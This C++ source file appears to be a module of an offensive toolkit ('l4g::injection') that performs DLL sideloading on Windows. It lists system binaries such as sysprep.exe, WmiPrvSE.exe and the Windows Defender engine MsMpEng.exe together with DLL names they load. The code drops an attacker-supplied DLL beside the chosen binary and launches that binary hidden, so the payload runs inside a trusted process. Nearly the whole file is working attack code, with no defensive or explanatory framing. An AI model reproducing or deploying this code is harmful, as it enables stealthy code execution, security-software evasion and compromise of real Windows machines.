#include "sideload.hpp"
#include <windows.h>
#include <shlwapi.h>
#include <filesystem>

#pragma comment(lib, "shlwapi.lib")

namespace l4g::injection {

static std::string narrow(const wchar_t* wide) {
    if (!wide) return {};
    int need = WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
    if (need <= 1) return {};
    std::string out((size_t)need - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wide, -1, out.data(), need, nullptr, nullptr);
    return out;
}

const DllSideload::VulnerableBinary DllSideload::VULNERABLE_BINARIES[] = {
    {L"C:\\Windows\\System32\\werfault.exe", L"wer.dll", L""},
    {L"C:\\Windows\\System32\\devobj.dll", L"devobj.dll", L""},
    {L"C:\\Windows\\System32\\sysprep\\sysprep.exe", L"cryptbase.dll", L"/generalize /oobe /reboot"},
    {L"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", L"wbemcomn.dll", L""},
    {L"C:\\Windows\\System32\\spoolsv.exe", L"winspool.drv", L""},
    {L"C:\\Windows\\System32\\taskhostw.exe", L"usercpl.dll", L""},
    {L"C:\\Program Files\\Windows Defender\\MsMpEng.exe", L"mpclient.dll", L""},
};
size_t DllSideload::VULNERABLE_COUNT = sizeof(VULNERABLE_BINARIES) / sizeof(VulnerableBinary);

SideloadResult DllSideload::sideload_dll(const std::vector<uint8_t>& dll_data, const std::wstring& target_dir, const std::wstring& dll_name) {
    SideloadResult result;
    std::wstring dll_path = target_dir + L"\\" + dll_name;
    
    if (!write_dll(dll_path, dll_data)) {
        result.error = "Failed to write DLL";
        return result;
    }
    
    result.success = true;
    result.dll_path = narrow(dll_path.c_str());
    return result;
}

SideloadResult DllSideload::deploy_and_execute(const std::vector<uint8_t>& dll_data, size_t binary_index) {
    SideloadResult result;
    if (binary_index >= VULNERABLE_COUNT) {
        result.error = "Invalid binary index";
        return result;
    }
    
    const auto& bin = VULNERABLE_BINARIES[binary_index];
    std::wstring target_dir = bin.path;
    size_t last_slash = target_dir.find_last_of(L'\\');
    if (last_slash != std::wstring::npos) {
        target_dir = target_dir.substr(0, last_slash);
    }
    
    result = sideload_dll(dll_data, target_dir, bin.dll_name);
    if (!result.success) return result;
    
    result.target_exe = narrow(bin.path);
    
    if (!execute_binary(bin.path, bin.args)) {
        result.error = "Failed to execute binary";
        cleanup(result);
        return result;
    }
    
    result.success = true;
    return result;
}

bool DllSideload::cleanup(const SideloadResult& result) {
    if (!result.dll_path.empty()) {
        std::filesystem::remove(result.dll_path);
    }
    return true;
}

bool DllSideload::write_dll(const std::wstring& path, const std::vector<uint8_t>& data) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD written = 0;
    bool ok = WriteFile(hFile, data.data(), (DWORD)data.size(), &written, nullptr);
    CloseHandle(hFile);
    return ok && written == data.size();
}

bool DllSideload::execute_binary(const std::wstring& exe, const std::wstring& args) {
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {};
    std::wstring cmd = L"\"" + exe + L"\" " + args;
    
    bool ok = CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE,
                             CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, &si, &pi);
    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok;
}

} // namespace l4g::injection